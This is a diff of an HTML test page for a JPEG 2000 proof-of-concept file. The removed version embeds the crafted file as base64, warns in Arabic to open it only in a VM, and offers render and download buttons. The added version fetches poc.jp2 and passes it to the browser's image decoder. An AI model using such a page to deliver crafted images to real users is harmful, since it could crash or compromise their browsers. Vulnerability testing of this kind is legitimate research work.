@@ -1,80 +1,38 @@
-<!doctype html>
-<html lang="ar">
+<!DOCTYPE html>
+<html>
 <head>
 <meta charset="utf-8">
-<title>Simple JP2 tester</title>
+<title>JP2 Test</title>
 </head>
 <body>
-  <h3>Simple JP2 tester — ضع Base64 ثم جرّب</h3>
-  <p style="color:crimson"><strong>تحذير:</strong> إن كان الملف PoC لا تفتحه إلا في VM أو جهاز اختبار.</p>
-
-  <textarea id="b64" style="width:100%;height:120px">
-AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABJanAyaAAAABZpaGRyAAAAIAAAAEAA
-AwgHAAAAAAAPY29scgEAAAAAABIAAAAcY2RlZgADAAAAAAACAAEAAAACAAIAAAACAAAAympwMmP/
-T/9RAC8AAAAAAEAAAAAgAAAAAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAMHAQEHAgIHAgL/UgAMAAAA
-AQAGAgIAAf9cABYgQEhIUEhIUEhIUEhIUEhIUEhIUP+QAAoAAAAAAGcAAf+T32gQCYf/AAgH/wAI
-BwAAAKHzggABuwAAp9oMC0FzRGLwAACj6gkACchYhMatzBLXAACh848AZRCkKnPzhveC/MUI/qlg
-AACx+oF/UCiMWOlqioxY6WqKAAD/2Q==
-  </textarea>
-  <div style="margin-top:8px">
-    <button id="render">عرض</button>
-    <button id="download">تنزيل poc.jp2</button>
-  </div>
-
-  <div id="status" style="margin-top:12px;color:#333">لم يتم عرض شيء بعد.</div>
-  <img id="img" style="max-width:100%;display:block;margin-top:8px;display:none" alt="JP2 preview">
-  <pre id="hex" style="background:#f3f3f3;padding:8px;display:none"></pre>
+<h3>JP2 Test Page</h3>
+<button id="show">Show poc.jp2</button>
+<p id="info">Idle</p>
+<img id="img" style="max-width:100%;display:none">
 
 <script>
-function b64ToU8(b64){
-  b64 = b64.replace(/\\s+/g,'');
-  try {
-    const bin = atob(b64);
-    const u8 = new Uint8Array(bin.length);
-    for(let i=0;i<bin.length;i++) u8[i]=bin.charCodeAt(i);
-    return u8;
-  } catch(e){
-    return null;
-  }
-}
-function hexDump(u8, n=16){
-  let s='';
-  for(let i=0;i<Math.min(u8.length,n);i++){
-    s += u8[i].toString(16).padStart(2,'0') + ( (i%2)?' ':'');
-    if((i+1)%8===0) s += '\\n';
-  }
-  return s.trim();
-}
-
-document.getElementById('render').addEventListener('click', ()=>{
-  const b64 = document.getElementById('b64').value;
-  const u8 = b64ToU8(b64);
-  const status = document.getElementById('status');
-  if(!u8){ status.textContent='فشل تحويل Base64 — تأكد من السلسلة.'; status.style.color='crimson'; return; }
-  const blob = new Blob([u8], {type:'image/jp2'});
-  const url = URL.createObjectURL(blob);
+document.getElementById('show').onclick = async () => {
+  const info = document.getElementById('info');
   const img = document.getElementById('img');
-  img.onload = ()=>{ status.textContent='حاول المتصفح عرض الصورة (إن دعم JP2).'; status.style.color='green'; };
-  img.onerror = ()=>{ status.textContent='فشل العرض — المتصفح قد لا يدعم JP2.'; status.style.color='crimson'; };
-  img.src = url;
-  img.style.display = 'block';
-  document.getElementById('hex').style.display='block';
-  document.getElementById('hex').textContent = 'أول 16 بايت (هيكس):\\n' + hexDump(u8,16);
-});
-
-document.getElementById('download').addEventListener('click', ()=>{
-  const b64 = document.getElementById('b64').value;
-  const u8 = b64ToU8(b64);
-  if(!u8){ alert('فشل تحويل Base64.'); return; }
-  const blob = new Blob([u8], {type:'application/octet-stream'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'poc.jp2';
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  alert('بدأ تنزيل poc.jp2');
-});
+  info.textContent = 'Fetching poc.jp2...';
+  try {
+    const resp = await fetch('poc.jp2');
+    if(!resp.ok) throw new Error('HTTP ' + resp.status);
+    const buf = await resp.arrayBuffer();
+    const u8 = new Uint8Array(buf);
+    const sig = [0x00,0x00,0x00,0x0c,0x6a,0x50,0x20,0x20];
+    const valid = u8.length >= 8 && sig.every((v,i)=>u8[i]===v);
+    info.textContent = valid ? 'JP2 signature detected. Trying to render...' : 'No JP2 signature. Trying to render...';
+    const blob = new Blob([u8], {type: 'image/jp2'});
+    const url = URL.createObjectURL(blob);
+    img.src = url;
+    img.style.display = 'block';
+    img.onload = () => info.textContent = 'Image displayed (browser supports JP2).';
+    img.onerror = () => info.textContent = 'Failed to display (browser does not support JP2).';
+  } catch(e) {
+    info.textContent = 'Error: ' + e.message;
+  }
+};
 </script>
 </body>
 </html>
